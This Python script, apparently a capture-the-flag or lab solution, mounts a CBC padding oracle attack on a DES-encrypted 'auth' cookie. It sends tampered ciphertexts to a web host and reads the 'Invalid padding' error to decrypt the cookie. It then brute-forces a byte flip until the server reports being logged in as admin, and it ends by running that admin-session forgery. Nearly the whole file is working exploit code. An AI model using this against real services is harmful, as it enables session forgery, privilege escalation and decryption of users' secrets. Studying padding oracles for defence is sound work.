from Crypto.Cipher import DES
from Crypto.Util.Padding import pad, unpad
import codecs
from Crypto.Random import get_random_bytes
from urllib.parse import urlencode
import http.client
import base64
import urllib

REF_BYTES = [0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08]

key = b'Sixteen '
iv = b'\0\0\0\0\0\0\0\0'

HOST = "some host"
URL = "some url"
ERROR = "Invalid padding"

def test_validity(response, error):
    try:
        value = int(error)
        if int(response.status) == value:
            return False
    except ValueError:
        pass  # it was a string, not an int.

    # oracle response with data in the DOM
    data = response.read()
    #rint(data, error.encode())
    if data.find(error.encode()) == -1:
        return True
    return False

def call_oracle(host, url, up_cipher):
    cookieVal = urllib.parse.quote(base64.b64encode(up_cipher).decode())
    #print(cookieVal)

    params = urlencode({})
    headers = {
        "Accept": "*/*",
        "Cookie": "auth=" + cookieVal,
    }
    conn = http.client.HTTPConnection(host)
    conn.request("GET", url, params, headers)
    response = conn.getresponse()
    return conn, response

def split_len(seq, length):
  return [seq[i : i + length] for i in range(0, len(seq), length)]

def join_blocks(blocks):
  return b''.join(blocks)

def encrypt():
  cipher = DES.new(key, DES.MODE_CBC, iv)
  plaintext = b'testSlowABC'
  msg = iv + cipher.encrypt(pad(plaintext, 8))
  return msg

def try_decrypt_origin(ct):
  cipher2 = DES.new(key, DES.MODE_CBC, iv)
  try:
    pt = unpad(cipher2.decrypt(ct), 8)
    return True
  except:
    return False

def try_decrypt_origin2(ct):
  conn, response = call_oracle(HOST, URL, ct)
  return test_validity(response, ERROR)

def decrypt(cipher, size_block):
  cipher_block = split_len(cipher, size_block)
  print(cipher_block)
  pt = bytearray(bytes(len(cipher)))
  it = bytearray(bytes(len(cipher)))
  for block in reversed(range(1, len(cipher_block))):
    bp = cipher_block[block - 1]
    for i in range(0, size_block):
      byte_pos = 7-i
      ct_pos_origin = bp[byte_pos]
      e_prim_pos = None
      for ct_pos in range(0, 256):
        if ct_pos == ct_pos_origin:
          continue
        new_bp = bytearray(bp[:])
        if byte_pos < (size_block-1):
          for xx in reversed(range(byte_pos+1, size_block)):
            new_bp[xx] = it[block*size_block+xx] ^ (i+1)
        new_bp[byte_pos] = ct_pos
        new_ct = b''.join(cipher_block[0:block-1]) + bytes(new_bp) + b''.join(cipher_block[block:block+1])
        if try_decrypt_origin2(new_ct) == True:
          print('block found', new_ct)
          #print(block, byte_pos, ct_pos, new_bp, ct_pos_origin, new_ct)
          e_prim_pos = ct_pos
          break
      if e_prim_pos == None:
        print("hmm, no block found")
        e_prim_pos = ct_pos_origin
      it[block*size_block + byte_pos] = REF_BYTES[i] ^ e_prim_pos
      pt_pos = e_prim_pos ^ REF_BYTES[i] ^ ct_pos_origin
      pt[block*size_block + byte_pos] = pt_pos
      #print(it, pt)
  return bytes(pt)

def test():
  msg = encrypt()
  plain = decrypt(msg, 8)
  print(plain)

def attack():
	cipher = base64.b64decode(urllib.parse.unquote("u7bvLewln6PJPSAbMb5pFfnCHSEd6olf"))
	plain = decrypt(cipher, 8)
	print(plain, plain.decode())

def try_decrypt_origin3(ct):
  conn, response = call_oracle(HOST, URL, ct)
  return test_validity(response, "You are currently logged in as admin")

def reencrypt(cipher, pos):
  ct = bytearray(cipher)
  for ct_pos in range(0, 256):
    ct[pos] = ct_pos
    pt = try_decrypt_origin3(bytes(ct))
    if pt == False:
      print('Hurry!', ct)
      return ct

def attack_reencrypt():
    cipher = base64.b64decode(urllib.parse.unquote("u7bvLewln6PJPSAbMb5pFfnCHSEd6olf"))
    new_ct = reencrypt(cipher, 5) #00000000user=admin
    new_ct_b64 = urllib.parse.quote(base64.b64encode(new_ct).decode())
    print(new_ct_b64)

attack_reencrypt()
